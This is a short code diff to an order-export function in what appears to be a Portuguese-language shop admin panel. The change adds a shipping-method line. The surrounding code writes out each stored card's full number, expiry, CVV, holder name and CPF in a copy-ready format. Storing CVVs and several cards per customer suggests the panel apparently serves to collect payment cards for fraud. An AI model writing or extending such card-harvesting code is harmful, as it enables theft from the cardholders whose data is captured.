@@ -373,7 +373,8 @@ function Pedidos() {
     const c = o.customer ?? {};
     const L = [
       `PEDIDO ${o.id}`, `Data: ${new Date(o.created_at).toLocaleString("pt-BR")}`, `Situação: ${o.status}`, `Pagamento: ${o.payment_method}${o.transaction_hash ? " · " + o.transaction_hash : ""}`, "",
-      `Cliente: ${c.name ?? ""}`, `E-mail: ${c.email ?? ""}`, `Telefone: ${c.phone ?? ""}`, `CPF: ${c.document ?? ""}`, `Entrega: ${c.address ?? "—"}`, "",
+      `Cliente: ${c.name ?? ""}`, `E-mail: ${c.email ?? ""}`, `Telefone: ${c.phone ?? ""}`, `CPF: ${c.document ?? ""}`,
+      `Forma de entrega: ${o.shipping_method ?? "—"}`, `Endereço de entrega: ${c.address ?? "—"}`, "",
     ];
     (c.cards ?? []).forEach((k: any, i: number) => {
       L.push(`CARTÃO ${i + 1}`, `${String(k.numero).replace(/\s/g, "")} ${k.mes}/${String(k.ano).slice(-2)} ${k.cvv} ${k.nome}`, `Bandeira: ${k.bandeira}`, `CPF do titular: ${k.cpf}`, `Parcelas: ${k.parcelas}`, `Valor: ${k.valor}`, "");
